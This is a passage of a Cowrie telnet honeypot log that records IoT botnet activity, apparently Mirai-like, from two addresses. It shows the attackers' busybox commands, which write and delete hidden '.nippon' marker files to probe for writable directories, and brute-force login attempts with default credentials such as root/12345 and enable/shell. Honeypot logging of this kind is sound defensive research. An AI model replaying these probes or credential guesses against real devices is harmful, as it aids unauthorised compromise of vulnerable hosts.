+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /proc/sys/fs/binfmt_misc/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon; /bin/busybox cat /sys/fs/fuse/connections/.nippon; /bin/busybox rm /sys/fs/fuse/connections/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox cat /sys/fs/fuse/connections/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: cat /sys/fs/fuse/connections/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: /bin/busybox rm /sys/fs/fuse/connections/.nippon
+2017-02-27T16:31:47+0000 [CowrieTelnetTransport,8493,185.2.82.6] Command found: rm /sys/fs/fuse/connections/.nippon
+2017-02-27T16:31:49+0000 [CowrieTelnetTransport,8494,185.2.82.7] login attempt: 3069
+2017-02-27T16:31:49+0000 [CowrieTelnetTransport,8494,185.2.82.7] login return, expect: [root/jvbzd]
+2017-02-27T16:31:49+0000 [CowrieTelnetTransport,8494,185.2.82.7] login attempt [root/12345] failed
+2017-02-27T16:31:49+0000 [CowrieTelnetTransport,8494,185.2.82.7] Warning: state changed and new state returned
+2017-02-27T16:31:50+0000 [CowrieTelnetTransport,8494,185.2.82.7] login attempt: 3070
+2017-02-27T16:31:50+0000 [CowrieTelnetTransport,8494,185.2.82.7] login return, expect: [root/jvbzd]
+2017-02-27T16:31:50+0000 [CowrieTelnetTransport,8494,185.2.82.7] login attempt [enable/shell] failed
+2017-02-27T16:31:50+0000 [CowrieTelnetTransport,8494,185.2.82.7] Warning: state changed and new state returned
+2017-02-27T16:31:51+0000 [CowrieTelnetTransport,8494,185.2.82.7] login attempt: 3071
+2017-02-27T16:31:51+0000 [CowrieTelnetTransport,8494,185.2.82.7] login return, expect: [root/jvbzd]
+2017-02-27T16:31:51+0000 [CowrieTelnetTransport,8494,185.2.82.7] login attempt [sh//bin/busybox ECCHI] failed
+2017-02-27T16:31:51+0000 [CowrieTelnetTransport,8494,185.2.82.7] Warning: state changed and new state returned
+2017-02-27T16:31:58+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.2.82.7:36014 (10.8.41.81:2223) [session: TT8495]
